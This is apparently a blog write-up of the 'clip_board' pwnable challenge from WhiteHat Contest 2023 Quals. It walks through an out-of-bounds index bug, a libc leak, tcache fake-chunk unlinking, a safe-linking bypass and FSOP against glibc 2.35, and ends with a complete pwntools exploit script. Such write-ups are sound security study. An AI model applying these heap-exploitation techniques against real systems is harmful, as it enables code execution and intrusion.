+++
title = "WhiteHat Contest 2023 Quals - clip_board"
date = "2024-08-30"
description = "WhiteHat Contest 2023 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "fsop", "tcache unlinking", "safe linking"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/clip_board'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Concept
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  ...
  v3 = malloc(0x20uLL);
  printf("heap leak: %p\n\n", v3);
  do
  {
    Menu();
    choice = get_int();
    switch ( choice )
    {
      case 1:
        AddClipboard();
        break;
      case 2:
        DelClipboard();
        break;
      case 3:
        ViewClipboard();
        break;
      case 4:
        exit = 1;
        break;
    }
  }
  while ( !exit );
  return 0;
}
```

Three functionalities `AddClipboard()`, `DelClipboard()`, and `ViewClipboard()` are implemented based on heap.

Conveniently, it prints one heap address, so we don't need to leak heap separately.

### Global variables
``` c
char *chunk_list[10];
char check_chunk_list[10];      // size = 16
int chunk_size_list[10];
```

For example, when executing `AddClipboard()` and inputting `i` for `index`, these values are set in the above structures.

- `chunk_list[i]` : `malloc(size)`
- `check_chunk_list[i]` : `1`
- `chunk_size_list[i]` : `size`

Here, `check_chunk_list` is allocated `16` bytes, perhaps due to alignment.


## 0x01. Vulnerability
``` c
int ViewClipboard()
{
  ...
  printf("index > ");
  index = get_int();
  if ( index <= 9 )
  {
    check = check_chunk_list_4090[index];
    if ( check )
    {
      ptr = chunk_list_4040[index];
      size = chunk_size_list_40A0[index];
      if ( ptr )
      {
        if ( size <= 0x100 )
          return write(1, ptr, size);
      }
    }
  }
  return size;
}
```

`AddClipboard()`, `DelClipboard()`, and `ViewClipboard()` all have an OOB vulnerability since they don't verify when the `index` value is negative.

However, to get the desired behavior, `check` must have a non-zero value, so we need to carefully check the values in the area above `check_chunk_list`.


## 0x02. Exploit
### Libc leak
``` bash
gef➤  x/20gx 0x555555558000
0x555555558000: 0x0000000000000000      0x0000555555558008
0x555555558010: 0x0000000000000000      0x0000000000000000
0x555555558020 <stdout@GLIBC_2.2.5>:    0x00007ffff7fa5780      0x0000000000000000
0x555555558030 <stdin@GLIBC_2.2.5>:     0x00007ffff7fa4aa0      0x0000000000000000
0x555555558040 <chunk_list>:    0x0000000000000000      0x0000000000000000
0x555555558050 <chunk_list+16>: 0x0000000000000000      0x0000000000000000
0x555555558060 <chunk_list+32>: 0x0000000000000000      0x0000000000000000
0x555555558070 <chunk_list+48>: 0x0000000000000000      0x0000000000000000
0x555555558080 <chunk_list+64>: 0x0000000000000000      0x0000000000000000
0x555555558090 <check_chunk_list>:      0x0000000000000000      0x0000000000000000
```

Looking at the area above `chunk_list` to exploit the vulnerability with negative `index`, we find `stdout` and `stdin`.

A bss region address is written to the `0x555555558008` area with the variable name `__dso_handle`. Checking it revealed it's only referenced once in `__do_global_dtors_aux` of `fini_array`. It's not particularly meaningful for this problem, but good to remember for future use.

`stdin` can be accessed as `chunk_list[-2]` and `stdout` as `chunk_list[-4]`. To read values with `ViewClipboard`, we need to put a non-zero value in `check_chunk_list[-2]` or `check_chunk_list[-4]`.

This means we need to put a value at `0x55555555808e` or `0x55555555808c`. Even if we input `9` for `index` to store the value returned by `malloc()` at `0x555555558088`, an address value would be written, putting `0` at `0x55555555808e`.

Therefore, only `stdout` can be viewed, and I obtained the libc address with the following payload.

``` python
    # leak libc
    add_clipboard(s, 1, 0x10, b"A" * 0x10)
    add_clipboard(s, 9, 0x10, b"B" * 0x10)
    r = view_clipboard(s, -4)
    libc = u64(r[8:16]) - 0x21b803
    stdout_fp = r[0:0xe0]
    log.info(f"libc : {hex(libc)}")

    # clean clipboards
    del_clipboard(s, 1)
    del_clipboard(s, 9)
```

### FSOP
``` bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/user/clip_board
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/user/clip_board
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/user/clip_board
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/user/clip_board
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/user/clip_board
```

Since Full RELRO is applied, the GOT area is not writable, so between `0x555555558000` and `chunk_list` there's only `stdout` and `stdin`.

Since we need to control RIP by modifying `stdout` or `stdin`, I searched for resources and found the FSOP technique.

For the FSOP technique, I used the content summarized in [this post](../exploiting-fsop-in-glibc-2-35/).

In the problem, we can freely allocate memory using the `AddClipboard()` function, and since the heap address was provided initially, I calculated the offset and wrote the payload as follows.

``` python
    # allocate wide_vtable
    one_gadget = libc + 0xebc85
    payload = p64(0) * 2                        # dummy
    payload += p64(one_gadget) * 19
    add_clipboard(s, 6, len(payload), payload)
    wide_vtable = heap + 0x4a0

    # allocate anywhere can read / write
    add_clipboard(s, 7, 0x100, b"\x00" * 8)
    anywhere_rw = heap + 0x550

    # allocate wide_data
    payload = bytearray(0x100)
    payload[0x18:0x20] = p64(0)
    payload[0x20:0x28] = p64(anywhere_rw)
    payload[0x30:0x38] = p64(0)
    payload[0xe0:0xe8] = p64(wide_vtable)
    add_clipboard(s, 8, len(payload), payload)
    wide_data = heap + 0x660

    # allocate new_fp and overwrite stdout
    io_wfile_jumps = libc + 0x2170c0
    payload = bytearray(stdout_fp)
    payload[0:8] = p64(0)                       # stdout -> flags
    payload[0xa0:0xa8] = p64(wide_data)         # stdout -> _wide_data
    payload[0xc0:0xc8] = p64(1)                 # stdout -> mode
    payload[0xd8:0xe0] = p64(io_wfile_jumps)    # stdout -> vtable
    add_clipboard(s, -4, 0x100, payload, fin=1)
```

Uh... I explained enthusiastically, but there's actually one major problem.

When overwriting `stdout` at `chunk_list[-4]` using the OOB vulnerability, memory looks like this image.

![overwrite stdout](https://github.com/user-attachments/assets/516ba80e-e929-4134-8286-90478be22a81)

However, since `_IO_flush_all_lockp` actually traverses `_IO_list_all` checking for overflow in file streams, for the attacker's allocated `wide_vtable`'s `one_gadget` function to be called, memory needs to look like this image.

![overwrite stdout and unlink _IO_list_all](https://github.com/user-attachments/assets/3d1e80f6-522d-4118-bc39-b87ff0a4e7df)

Therefore, we need to overwrite the `_IO_list_all` pointer in the libc region...

It's unfortunate that I wouldn't have had to do this if I'd found another FSOP scenario that directly accesses values stored in `stdout`...

### tcache unlink
Looking at the code with the feeling of seeing a completely new challenge, we can see `DelClipboard()` performs this operation.

``` c
int DelClipboard()
{
  ...
      ptr = chunk_list_4040[index];
      if ( ptr )
      {
        free(ptr);
        chunk_list_4040[index] = 0LL;
        check_chunk_list_4090[index] = 0;
        size = chunk_size_list_40A0;
        chunk_size_list_40A0[index] = 0;
      }
  ...
}
```

It resets the value of `check_chunk_list[index]` set to `1` in `AddClipboard()` back to `0`.

Above `check_chunk_list` will be addresses of heap regions allocated by `malloc()`. If the order of `malloc()` and `free()` is the same, the offsets will be identical, so we can predict without leaking the allocated address.

Therefore, after aligning heap so `malloc` returns a `0xXXXXXXXXXX10` address, creating a fake chunk header at `0xXXXXXXXXXX00` address, then changing the last byte `0x10` to `0x00` allows freeing the fake chunk.

``` python
    # align last byte
    add_clipboard(s, -8, 0xc0, b"C" * 0x20)

    # make fake chunk header
    payload = b"D" * 0x10
    payload += p64(0)
    payload += p64(0x101)
    add_clipboard(s, 0, 0x20, payload)

    # allocate XXXXXXXXX410, XXXXXXXXX440, XXXXXXXXX470 chunks
    add_clipboard(s, 9, 0x20, b"E" * 0x30)
    add_clipboard(s, 1, 0x20, b"F" * 0x20)
    add_clipboard(s, 2, 0x20, b"G" * 0x20)

    # overwrite 410 -> 400 and free fake chunk (size 0x100)
    del_clipboard(s, -8)
    del_clipboard(s, 9)

    # free XXXXXXXXX440, XXXXXXXXX470
    del_clipboard(s, 2)
    del_clipboard(s, 1)
```

After writing the payload above and executing the code, checking tcache bins for sizes `0x30` and `0x100` shows:

``` bash
─────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────
Tcachebins[idx=1, size=0x30, count=2] ←  Chunk(addr=0x555555559440, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
                                      ←  Chunk(addr=0x555555559470, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Tcachebins[idx=14, size=0x100, count=1] ←  Chunk(addr=0x555555559400, size=0x100, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
```

This makes the `0x555555559400` area overlap with `0x555555559440` and `0x555555559470`, so requesting a `0xf0`-sized chunk allows overwriting `0x555555559440`'s `fd`.

### Safe linking bypass
However, checking `0x555555559440` and `0x555555559470`'s `fd` shows it doesn't simply store the next chunk's address, due to tcache's safe linking.

``` bash
gef➤  x/6gx 0x555555559440 - 0x10
0x555555559430: 0x0000000000000000      0x0000000000000031
0x555555559440: 0x000055500000c129      0x62cde40f9bbc5877
0x555555559450: 0x4646464646464646      0x4646464646464646
gef➤  x/6gx 0x555555559470 - 0x10
0x555555559460: 0x0000000000000000      0x0000000000000031
0x555555559470: 0x0000000555555559      0x62cde40f9bbc5877
0x555555559480: 0x4747474747474747      0x4747474747474747
```

To briefly summarize while studying, from glibc 2.32, freed chunks have this structure.

``` c
struct tcache_entry {
    struct tcache_entry *next;
    /* This field exists to detect double frees.  */
    struct tcache_perthread_struct *key;
};
```

In the memory above, `0x62cde40f9bbc5877` is the `key`, which prevents double free through this logic:

1. When doing `free(ptr)`,
2. Verify if `ptr->key` has proper `key` value
  - If not, `abort`
3. If proper `key` value exists, traverse tcache bin matching `ptr`'s `size`
  - If `ptr` is in bin, `abort`

The problem is `next`. Depending on glibc version (2.35 in this case), pointer masking or encryption is applied, performing this operation before storing:

``` c
// Encryption
entry->next = (tcache_entry *) ((uintptr_t) next ^ (uintptr_t) tcache);

// Decryption
tcache_entry *next = (tcache_entry *) ((uintptr_t) e->next ^ (uintptr_t) tcache);
```

The `tcache` value here is supposedly the address of `tcache_perthread_struct`... but it seemed different from actual memory, so I searched elixir for 2.35 glibc source code but something doesn't match - needs verification.

Anyway, the actual `tcache` value used in xor operation is `0x555555559` (heap base address right shifted 12 bits), visible in the `0x555555559470` chunk where `next` should be null.

Therefore, writing the result of xoring `0x555555559` with `_IO_list_all`'s address `0x7ffff7fa5680` to `0x555555559440` chunk's `next` position configures tcache bin as follows.

``` bash
─────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────
Tcachebins[idx=1, size=0x30, count=2] ←  Chunk(addr=0x555555559440, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
                                      ←  Chunk(addr=0x7ffff7fa5680, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x7ffff7fa5680]
```

The `0` located 8 bytes before `_IO_list_all`'s address `0x7ffff7fa5680` is interpreted as `size`, outputting corrupted chunk. Fortunately, `malloc()` doesn't verify `size`, successfully returning `0x7ffff7fa5680`.

``` python
    # reallocate fake 0x100 chunk and overwrite fd of XXXXXXXXX440
    # now XXXXXXXXX440 -> IO_list_all
    io_list_all = libc + 0x21b680
    payload = b"H" * 0x38
    payload += p64(0x31)
    payload += p64(io_list_all ^ (heap >> 12))
    add_clipboard(s, 3, 0xf0, payload)

    # allocating 5 returns address of IO_list_all
    add_clipboard(s, 4, 0x20, b"I" * 0x20)
    add_clipboard(s, 5, 0x20, p64(heap + 0x770))
```

Executing this payload stores the created `new_fd` address in the targeted `_IO_list_all`.

``` bash
gef➤  x/gx 0x7ffff7fa5680
0x7ffff7fa5680 <_IO_list_all>:  0x0000555555559770
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "clip_board"
LIBRARY = "libc.so.6"
CONTAINER = "69049f0398fe"
code_base = 0x0000555555554000
bp = {
    'main' : code_base + 0x16FD
}

gs = f'''
gef config gef.bruteforce_main_arena True
b *0x7ffff7e1e8e0
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def add_clipboard(s, index, size, contents, fin=0):
    s.sendline(b"1")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    s.recvuntil(b"> ")
    s.sendline(str(size).encode())
    s.recvuntil(b"> ")
    s.send(contents)
    if fin:
        return
    else:
        return s.recvuntil(b"\n> ")

def del_clipboard(s, index):
    s.sendline(b"2")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    return s.recvuntil(b"\n> ")

def view_clipboard(s, index):
    s.sendline(b"3")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    return s.recvuntil(b"\n> ")

def exit_clipboard(s):
    s.sendline(b"4")
    return

def main(port, debug):
    if(port):
        s = remote("0.0.0.0", port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    heap = int(s.recvuntil(b"> ").split(b'\n')[0].split(b': ')[1], 16) & 0xfffffffffffff000
    log.info(f"heap : {hex(heap)}")
    
    # leak libc
    add_clipboard(s, 1, 0x10, b"A" * 0x10)
    add_clipboard(s, 9, 0x10, b"B" * 0x10)
    r = view_clipboard(s, -4)
    libc = u64(r[8:16]) - 0x21b803
    stdout_fp = r[0:0xe0]
    log.info(f"libc : {hex(libc)}")

    # clean clipboards
    del_clipboard(s, 1)
    del_clipboard(s, 9)

    # align last byte
    add_clipboard(s, -8, 0xc0, b"C" * 0x20)

    # make fake chunk header
    payload = b"D" * 0x10
    payload += p64(0)
    payload += p64(0x101)
    add_clipboard(s, 0, 0x20, payload)

    # allocate XXXXXXXXX410, XXXXXXXXX440, XXXXXXXXX470 chunks
    add_clipboard(s, 9, 0x20, b"E" * 0x30)
    add_clipboard(s, 1, 0x20, b"F" * 0x20)
    add_clipboard(s, 2, 0x20, b"G" * 0x20)
    
    # overwrite 410 -> 400 and free fake chunk (size 0x100)
    del_clipboard(s, -8)
    del_clipboard(s, 9)

    # free XXXXXXXXX440, XXXXXXXXX470
    del_clipboard(s, 2)
    del_clipboard(s, 1)

    # reallocate fake 0x100 chunk and overwrite fd of XXXXXXXXX440
    # now XXXXXXXXX440 -> IO_list_all
    io_list_all = libc + 0x21b680
    payload = b"H" * 0x38
    payload += p64(0x31)
    payload += p64(io_list_all ^ (heap >> 12))
    add_clipboard(s, 3, 0xf0, payload)

    # allocating 5 returns address of IO_list_all
    add_clipboard(s, 4, 0x20, b"I" * 0x20)
    add_clipboard(s, 5, 0x20, p64(heap + 0x770))
    
    # allocate wide_vtable
    one_gadget = libc + 0xebc85
    payload = p64(0) * 2                        # dummy
    payload += p64(one_gadget) * 19
    add_clipboard(s, 6, len(payload), payload)
    wide_vtable = heap + 0x4a0

    # allocate anywhere can read / write
    add_clipboard(s, 7, 0x100, b"\x00" * 8)
    anywhere_rw = heap + 0x550

    # allocate wide_data
    payload = bytearray(0x100)
    payload[0x18:0x20] = p64(0)
    payload[0x20:0x28] = p64(anywhere_rw)
    payload[0x30:0x38] = p64(0)
    payload[0xe0:0xe8] = p64(wide_vtable)
    add_clipboard(s, 8, len(payload), payload)
    wide_data = heap + 0x660

    # allocate new_fp and overwrite stdout
    io_wfile_jumps = libc + 0x2170c0
    payload = bytearray(stdout_fp)
    payload[0:8] = p64(0)                       # stdout -> flags
    payload[0xa0:0xa8] = p64(wide_data)         # stdout -> _wide_data
    payload[0xc0:0xc8] = p64(1)                 # stdout -> mode
    payload[0xd8:0xe0] = p64(io_wfile_jumps)    # stdout -> vtable
    add_clipboard(s, -4, 0x100, payload, fin=1)

    log.info(f"&stdout : 0x555555558020")
    log.info(f"IO_list_all : {hex(io_list_all)}")
    log.info(f"IO_list_all -> 0x7ffff7fab6a0")
    log.info(f"original_stdout : 0x7ffff7fab780")
    log.info(f"wide_data : {hex(wide_data)}")
    log.info(f"io_wfile_jumps : {hex(io_wfile_jumps)}")
    log.info(f"anywhere_rw : {hex(anywhere_rw)}")
    log.info(f"wide_vtable : {hex(wide_vtable)}")
    log.info(f"one_gadget : {hex(one_gadget)}")

    # trigger _IO_flush_all_lockp
    exit_clipboard(s)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.port, args.debug)
```